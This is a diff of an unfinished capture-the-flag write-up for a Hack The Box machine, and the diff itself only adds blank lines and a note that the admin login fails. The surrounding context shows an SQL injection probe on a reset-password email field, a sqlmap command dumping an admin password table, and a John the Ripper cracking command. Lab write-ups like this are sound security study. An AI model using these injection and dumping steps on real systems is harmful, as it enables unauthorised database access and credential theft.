@@ -1,5 +1,6 @@
 # ROOM
 Usage from HTB :)
+
 I want to write  this writeup in english this time :)
 
 # Information gathering
@@ -58,6 +59,7 @@ Requests/sec.: 392.6572
 ```
 ## Manual search
 After trying multiple things, i found a field vulnerable to SQL injection in reset password page.
+
 This payload :
 ```
 bleh@bleh.com' AND 1=1;-- -
@@ -122,6 +124,7 @@ sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users -C password --dum
 +--------------------------------------------------------------+
 ```
 Finally !
+
 Now, we need to crack it.
 ```
 john --wordlist=/home/kali/Wordlist/rockyou.txt hash  
@@ -145,3 +148,4 @@ whatever1
 # Post exploit
 
 **NOT FINISH YET**
+**The admin account doesnt work and i dont know why. i'm working on it !** 
